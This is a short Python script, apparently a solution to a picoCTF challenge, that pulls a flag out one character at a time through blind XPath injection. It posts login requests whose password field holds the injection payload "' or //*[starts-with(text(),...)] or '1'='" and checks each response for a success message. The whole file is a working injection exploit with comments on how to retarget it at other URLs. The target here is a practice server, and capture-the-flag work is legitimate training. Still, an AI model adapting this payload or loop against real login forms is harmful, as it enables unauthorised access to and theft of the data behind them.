import requests
from string import *
unsolved = True
characters = ascii_lowercase + digits + "}_"
print(characters)
known = "{flagFormat}{" #replace the flag format
while unsolved:
	for char in characters:
		payload = known + char
		print(f"Trying {payload}")

		data = {"name":"admsin", "pass":f"' or //*[starts-with(text(),'{payload}')] or '1'='"}
		r = requests.post("http://mercury.picoctf.net:59946/", data=data) #replace the url
		content = r.text
		if "You&#39;re on the right path." in content: #replace this with the checker
			known = payload
			print(known)
			break
	if known.endswith('}'):
		exit()